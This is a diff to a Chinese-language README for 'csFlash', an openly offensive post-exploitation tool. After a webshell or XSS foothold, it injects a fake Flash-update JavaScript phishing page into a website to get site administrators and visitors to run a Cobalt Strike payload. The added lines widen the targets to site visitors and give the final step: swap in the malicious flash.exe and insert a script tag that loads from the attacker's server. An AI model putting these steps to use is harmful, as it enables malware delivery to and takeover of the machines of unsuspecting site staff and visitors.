@@ -1,8 +1,8 @@
 # csFlash
-适用于拿到webshell进行cs后渗透钓鱼
+适用于拿到webshell后进行cs钓鱼
 
 ## 效果
-当获取到webshell时，想获得运维人员工作主机权限，可在web中插入js钓鱼页面
+当获取到webshell或站点存在xss漏洞时，想获得站点运维人员/网站访问人员主机权限，可在web中插入js钓鱼页面
 
 参考 https://github.com/r00tSe7en/Flash-Pop
 ![image](https://user-images.githubusercontent.com/38282439/197719314-d685b6ec-b007-4097-a0a0-2f7e6463de53.png)
@@ -41,3 +41,8 @@ python3 flaskHttpd.py
                 proxy_pass $flaskHttpd;
                 }
 ```
+6.替换项目中flash.exe文件，将flask的url插入到web页面中
+```
+<script src=https://xxxxxx> </script>
+```
+
